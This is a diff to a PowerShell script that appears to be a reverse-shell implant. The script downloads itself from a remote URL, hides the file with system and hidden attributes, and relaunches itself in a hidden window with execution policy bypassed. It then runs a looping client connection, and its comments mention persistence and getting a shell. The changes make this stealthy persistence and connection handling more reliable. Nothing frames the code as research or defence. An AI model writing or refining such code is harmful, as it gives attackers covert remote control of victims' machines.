@@ -26,14 +26,16 @@ if (-not (Test-Path $WorkDir)) {
 
 # Improved path detection for iex/remote execution
 $CurrentPath = $null
-if ($PSCommandPath) { $CurrentPath = $PSCommandPath }
-elseif ($MyInvocation.MyCommand.Definition) { $CurrentPath = $MyInvocation.MyCommand.Definition }
+if ($PSCommandPath) { 
+    $CurrentPath = $PSCommandPath 
+} elseif ($MyInvocation.MyCommand.Path) { 
+    $CurrentPath = $MyInvocation.MyCommand.Path 
+}
 
 # Check if we are running from the final destination
 if ($null -eq $CurrentPath -or $CurrentPath -ne $FullPath) {
     Log-Debug "Not running from $WorkDir. Installing fresh copy from GitHub..."
     try {
-        # Use TLS 1.2 for the download
         [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
         Invoke-WebRequest -Uri $RemoteUrl -OutFile $FullPath -UseBasicParsing -ErrorAction Stop
         Log-Debug "Download successful: $FullPath"
@@ -42,13 +44,15 @@ if ($null -eq $CurrentPath -or $CurrentPath -ne $FullPath) {
             attrib +h +s $FullPath
         }
 
-        Log-Debug "Launching persistent process and exiting current session..."
-        # Fixed the typo in the ArgumentList below
-        Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$FullPath`""
-        exit
+        Log-Debug "Spawning background process and releasing terminal..."
+        # Using Start-Process with -PassThru and null-routing output to prevent terminal hanging
+        $procArgs = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$FullPath`""
+        Start-Process powershell.exe -ArgumentList $procArgs -NoNewWindow:$false
+        
+        # Force a stop to the current script execution to return the prompt to the user
+        return 
     } catch {
         Log-Debug "Installation failed: $($_.Exception.Message)"
-        # If download fails, we try to proceed in memory anyway to at least get a shell
     }
 }
 
@@ -128,5 +132,7 @@ while ($true) {
         Start-Sleep -Seconds 10
     } finally {
         if ($null -ne $client) { $client.Close() }
+        if ($null -ne $reader) { $reader.Close() }
+        if ($null -ne $writer) { $writer.Close() }
     }
 }
